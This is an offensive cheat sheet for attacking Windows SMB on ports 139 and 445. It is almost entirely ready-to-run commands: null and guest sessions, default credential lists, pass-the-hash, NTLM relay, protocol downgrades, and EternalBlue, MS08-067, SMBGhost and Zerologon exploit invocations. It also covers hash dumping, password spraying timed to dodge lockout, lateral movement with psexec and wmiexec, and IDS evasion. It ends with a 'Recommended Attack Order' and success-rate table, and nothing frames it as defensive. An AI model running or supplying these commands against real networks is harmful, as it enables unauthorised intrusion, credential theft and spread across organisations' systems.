# Port 139/445 - SMB Bypass Techniques

## Security Controls and Bypass Methods

---

## 1. Authentication Bypass

### Bypassing SMB Authentication

**Bypass Technique 1: Null Session Attack**
```bash
# Null session - anonymous connection (older Windows)
smbclient -L //192.168.1.100 -N
# -N: No password
# -L: List shares

# Using rpcclient
rpcclient -U "" -N 192.168.1.100
# Empty username, no password

# Enumerate with null session
enum4linux -a 192.168.1.100
enum4linux -U -N 192.168.1.100  # Users
enum4linux -S -N 192.168.1.100  # Shares

# Using Nmap
nmap -p 445 --script smb-enum-shares,smb-enum-users 192.168.1.100

# Manual null session (Windows)
net use \\192.168.1.100\IPC$ "" /user:""
```

**Why This Works**: Windows 2000/XP and some older Samba versions allow anonymous connections to IPC$ share

**Bypass Technique 2: Guest Account Access**
```bash
# Try guest account
smbclient -L //192.168.1.100 -U guest%
smbclient //192.168.1.100/share -U guest%

# Using smbmap
smbmap -H 192.168.1.100 -u guest -p ''

# CrackMapExec
crackmapexec smb 192.168.1.100 -u 'guest' -p ''

# Windows command
net use \\192.168.1.100\share /user:guest ""
```

**Bypass Technique 3: Default Credentials**
```bash
# Common SMB default credentials
# Try these combinations:

administrator:administrator
admin:admin
guest:guest
Administrator:password
admin:password123
user:user

# Automated testing
crackmapexec smb 192.168.1.100 -u admin -p admin
hydra -L users.txt -P passwords.txt smb://192.168.1.100

# Specific vendor defaults
# Dell: root:calvin
# HP: Administrator:password
```

**Bypass Technique 4: Pass-the-Hash (PTH)**
```bash
# If you captured NTLM hash, use directly (no need to crack)
# Format: username:RID:LM_hash:NT_hash

# Using pth-winexe
pth-winexe -U DOMAIN/user%aad3b435b51404eeaad3b435b51404ee:hash //192.168.1.100 cmd

# Using CrackMapExec
crackmapexec smb 192.168.1.100 -u admin -H 'aad3b435b51404eeaad3b435b51404ee:hash'

# Using Impacket psexec
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:hash admin@192.168.1.100

# Using Metasploit
use exploit/windows/smb/psexec
set SMBUser admin
set SMBPass aad3b435b51404eeaad3b435b51404ee:hash
```

**Bypass Technique 5: Relay Attack (SMB Relay)**
```bash
# Capture and relay SMB authentication

# Using Responder + ntlmrelayx
# Terminal 1: Start Responder
responder -I eth0 -wrf

# Terminal 2: Relay to target
ntlmrelayx.py -tf targets.txt -smb2support

# Wait for victim to authenticate
# Relay automatically logs into targets

# Or use Metasploit
use auxiliary/server/capture/smb
set JOHNPWFILE captured_hashes.txt
run
```

---

## 2. SMB Signing Bypass

### Bypassing SMB Message Signing

**Bypass Technique 1: Disable Signing Negotiation**
```bash
# Check if signing required
nmap -p 445 --script smb-security-mode 192.168.1.100
nmap -p 445 --script smb2-security-mode 192.168.1.100

# If signing not required, relay attack works
crackmapexec smb 192.168.1.100 --gen-relay-list relay_targets.txt

# SMB Relay when signing disabled
ntlmrelayx.py -tf relay_targets.txt -smb2support
```

**Bypass Technique 2: Force SMBv1 (Downgrade)**
```bash
# SMBv1 has weaker security
# Force SMBv1 if v2/v3 have signing

smbclient -L //192.168.1.100 -m SMB2 -N  # Try SMB2
smbclient -L //192.168.1.100 -m SMB3 -N  # Try SMB3
smbclient -L //192.168.1.100 -m NT1 -N   # Force SMBv1

# Using smbmap
smbmap -H 192.168.1.100 --no-smb2

# Check SMB version
nmap -p 445 --script smb-protocols 192.168.1.100
```

**Bypass Technique 3: Machine Account Relay**
```bash
# Relay machine account (computer$)
# Has higher privileges than user accounts

# Trigger machine auth with printerbug
python3 printerbug.py domain/user:password@victim attacker_ip

# Capture with ntlmrelayx
ntlmrelayx.py -t smb://target -smb2support
```

---

## 3. Network Access Control Bypass

### Bypassing IP/Network Restrictions

**Bypass Technique 1: SMB over VPN/Tunnel**
```bash
# If SMB blocked by firewall externally
# Tunnel through VPN or SSH

# SSH tunnel
ssh -L 445:192.168.1.100:445 user@jumphost

# Then connect
smbclient -L //localhost -U user

# Or using proxychains
proxychains smbclient //192.168.1.100/share -U user
```

**Bypass Technique 2: SMB over NetBIOS (Port 139)**
```bash
# If port 445 blocked, try 139
smbclient -L //192.168.1.100 -p 139 -U user

# Using smbmap
smbmap -H 192.168.1.100 -P 139 -u user -p password

# NetBIOS name resolution
nmblookup -A 192.168.1.100
```

**Bypass Technique 3: WebDAV as SMB Alternative**
```bash
# If SMB blocked, try WebDAV (similar functionality)
davtest -url http://192.168.1.100/webdav

# Mount WebDAV as network drive
# Windows:
net use Z: http://192.168.1.100/webdav /user:admin password

# Linux:
mount -t davfs http://192.168.1.100/webdav /mnt/webdav
```

---

## 4. Exploiting Vulnerabilities

### Version-Specific Bypasses

**Bypass Technique 1: EternalBlue (MS17-010)**
```bash
# Check vulnerability
nmap -p 445 --script smb-vuln-ms17-010 192.168.1.100

# Exploit with Metasploit
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOST 192.168.1.100
set LHOST attacker_ip
exploit

# Or manual exploit
python eternalblue_exploit.py 192.168.1.100

# AutoBlue-MS17-010
git clone https://github.com/3ndG4me/AutoBlue-MS17-010
cd AutoBlue-MS17-010
chmod +x eternal_checker.py
python eternal_checker.py 192.168.1.100
```

**Bypass Technique 2: MS08-067 (Conficker)**
```bash
# Check vulnerability
nmap -p 445 --script smb-vuln-ms08-067 192.168.1.100

# Metasploit
use exploit/windows/smb/ms08_067_netapi
set RHOST 192.168.1.100
exploit
```

**Bypass Technique 3: SMBGhost (CVE-2020-0796)**
```bash
# Windows 10 versions 1903/1909
nmap -p 445 --script smb-vuln-cve-2020-0796 192.168.1.100

# Exploit (PoC available)
python3 smbghost_exploit.py 192.168.1.100
```

**Bypass Technique 4: SmbRelay/Zerologon**
```bash
# Zerologon (CVE-2020-1472)
# Check if vulnerable
python3 zerologon_tester.py DC_NAME 192.168.1.100

# Exploit
python3 cve-2020-1472-exploit.py DC_NAME 192.168.1.100
```

---

## 5. Credential Theft and Reuse

### Capturing and Reusing Credentials

**Bypass Technique 1: NTLM Relay from Other Services**
```bash
# Capture NTLM from HTTP, LDAP, etc.
# Relay to SMB

# Responder captures from multiple protocols
responder -I eth0 -wrf -v

# Relay to SMB
ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"

# Captured hashes saved for offline cracking
```

**Bypass Technique 2: Kerberoasting**
```bash
# If Active Directory environment
# Request TGS for service accounts

# Using Impacket
GetUserSPNs.py domain.com/user:password -dc-ip 192.168.1.100 -request

# Save hashes
GetUserSPNs.py domain.com/user:password -dc-ip 192.168.1.100 -request -outputfile kerberos.hash

# Crack with Hashcat
hashcat -m 13100 kerberos.hash rockyou.txt

# Use cracked credentials on SMB
smbclient //192.168.1.100/share -U service_account
```

**Bypass Technique 3: SAM/NTDS.dit Extraction**
```bash
# If you have admin access via other method
# Extract password hashes

# Using secretsdump (Impacket)
secretsdump.py administrator:password@192.168.1.100

# Using CrackMapExec
crackmapexec smb 192.168.1.100 -u admin -p password --sam
crackmapexec smb 192.168.1.100 -u admin -p password --lsa
crackmapexec smb 192.168.1.100 -u admin -p password --ntds

# Then crack or Pass-the-Hash
hashcat -m 1000 ntlm_hashes.txt rockyou.txt
```

---

## 6. Share Enumeration Bypass

### Bypassing Hidden/Restricted Shares

**Bypass Technique 1: Enumerate Hidden Shares**
```bash
# Hidden shares end with $
# C$, ADMIN$, IPC$, PRINT$

# List all shares including hidden
smbclient -L //192.168.1.100 -U user%password
smbmap -H 192.168.1.100 -u user -p password

# Try common administrative shares
smbclient //192.168.1.100/C$ -U administrator%password
smbclient //192.168.1.100/ADMIN$ -U administrator%password

# Enumerate with enum4linux
enum4linux -S 192.168.1.100

# Nmap
nmap -p 445 --script smb-enum-shares -script-args smbusername=user,smbpassword=pass 192.168.1.100
```

**Bypass Technique 2: Brute Force Share Names**
```bash
# Try common share names
for share in backup data files public share temp www upload documents; do
  smbclient //192.168.1.100/$share -U user%password 2>/dev/null && echo "Found: $share"
done

# Using automated tool
enum4linux -a 192.168.1.100

# smbmap with recursion
smbmap -H 192.168.1.100 -u user -p password -R
```

**Bypass Technique 3: Directory Traversal in Shares**
```bash
# Once connected to a share, try path traversal
smbclient //192.168.1.100/share -U user%password

smb> cd ..
smb> cd ..\..\..\windows\system32
smb> get sam

# Or direct path
smb> get \windows\system32\config\sam
```

---

## 7. Bypassing Account Lockout

### Avoiding Account Lockout During Brute Force

**Bypass Technique 1: Spray Attack (Password Spraying)**
```bash
# Try one password against many users
# Instead of many passwords against one user

# Using CrackMapExec
crackmapexec smb 192.168.1.100 -u users.txt -p 'Password123' --continue-on-success

# Using Metasploit
use auxiliary/scanner/smb/smb_login
set USER_FILE users.txt
set SMBPass Password123
set RHOSTS 192.168.1.100
run

# Spacing attempts
for user in $(cat users.txt); do
  smbclient -L //192.168.1.100 -U $user%Password123 2>&1 | grep -i "session setup failed"
  sleep 30  # 30 second delay between users
done
```

**Bypass Technique 2: Time-Based Attack**
```bash
# If lockout resets after X minutes
# Try 3-4 passwords, wait for reset

# Example: Try 3 attempts, wait 30 minutes
for i in {1..100}; do
  crackmapexec smb 192.168.1.100 -u admin -p pass1 pass2 pass3
  echo "Waiting 30 minutes for lockout reset..."
  sleep 1800
done
```

**Bypass Technique 3: Attack Different Accounts**
```bash
# Rotate through different accounts
# Instead of: admin,admin,admin
# Try: admin,user,guest,test

crackmapexec smb 192.168.1.100 -u users.txt -p passwords.txt --continue-on-success
```

---

## 8. SMB Encryption Bypass

### Bypassing SMB Encryption

**Bypass Technique 1: Force Unencrypted SMB**
```bash
# Try to force older, unencrypted protocol
smbclient -L //192.168.1.100 -m NT1 -U user

# Disable encryption in smbclient
smbclient //192.168.1.100/share -U user --option='client min protocol=NT1'

# Check if encryption required
nmap -p 445 --script smb2-security-mode 192.168.1.100
```

**Bypass Technique 2: Downgrade to SMBv1**
```bash
# SMBv1 doesn't support encryption
# Force SMBv1 if server allows

smbclient //192.168.1.100/share -U user -m NT1

# Check protocols
nmap -p 445 --script smb-protocols 192.168.1.100

# If SMBv1 enabled, MITM attack possible
```

---

## 9. Lateral Movement via SMB

### Using SMB for Pivoting

**Bypass Technique 1: PSExec for Remote Execution**
```bash
# Execute commands remotely via SMB
psexec.py domain/user:password@192.168.1.100 whoami

# With hash
psexec.py -hashes :hash user@192.168.1.100

# Metasploit
use exploit/windows/smb/psexec
set SMBUser admin
set SMBPass password
set RHOST 192.168.1.100
exploit
```

**Bypass Technique 2: WMI Execution**
```bash
# Windows Management Instrumentation via SMB
wmiexec.py domain/user:password@192.168.1.100

# Execute command
wmiexec.py domain/user:password@192.168.1.100 "whoami"

# With hash
wmiexec.py -hashes :hash user@192.168.1.100
```

**Bypass Technique 3: DCOM Execution**
```bash
# Using DCOM for execution
dcomexec.py domain/user:password@192.168.1.100

# Command execution
dcomexec.py domain/user:password@192.168.1.100 "ipconfig"
```

---

## 10. Firewall and IDS Evasion

### Avoiding Detection

**Bypass Technique 1: Slow Enumeration**
```bash
# Reduce scan speed
nmap -p 445 -T2 192.168.1.100  # Polite timing
enum4linux -a 192.168.1.100 -w 5  # Wait 5 seconds

# Manual slow approach
# One connection at a time with delays
```

**Bypass Technique 2: Fragmentation**
```bash
# Fragment SMB packets
nmap -p 445 -f 192.168.1.100  # Fragment packets
nmap -p 445 --mtu 16 192.168.1.100  # Custom MTU
```

**Bypass Technique 3: Use Legitimate Tools**
```bash
# Use built-in Windows tools (less suspicious)
net view \\192.168.1.100
net use Z: \\192.168.1.100\share /user:admin password

# Instead of:
# crackmapexec, smbmap (more suspicious in logs)
```

---

## Bypass Success Rates

| Technique | Success Rate | Detection Risk | Difficulty |
|-----------|--------------|----------------|------------|
| Null Session | 15% | Low | Easy |
| Guest Account | 25% | Low | Easy |
| Default Credentials | 30% | Low | Easy |
| Pass-the-Hash | 70% | Medium | Medium |
| SMB Relay | 50% | High | Medium |
| EternalBlue | 10% | High | Medium |
| Password Spraying | 40% | Low | Easy |
| Kerberoasting | 60% | Medium | Medium |

---

## Recommended Attack Order

1. **Null session** (quick, low risk)
2. **Guest account** (often enabled)
3. **Default credentials** (common wins)
4. **Share enumeration** (find writable shares)
5. **Check vulnerabilities** (EternalBlue, etc.)
6. **Password spraying** (avoid lockout)
7. **Relay attacks** (if signing disabled)
8. **Pass-the-Hash** (if you have hashes)
9. **Kerberoasting** (in AD environments)
10. **Advanced exploits** (if all else fails)

---

## Important Notes

- SMB is heavily monitored in corporate environments
- Failed logins trigger alerts quickly
- Pass-the-Hash is very effective but detectable
- Always check for SMB signing before relay attacks
- Combine techniques for better results

---

**Last Updated**: 2026-06-16
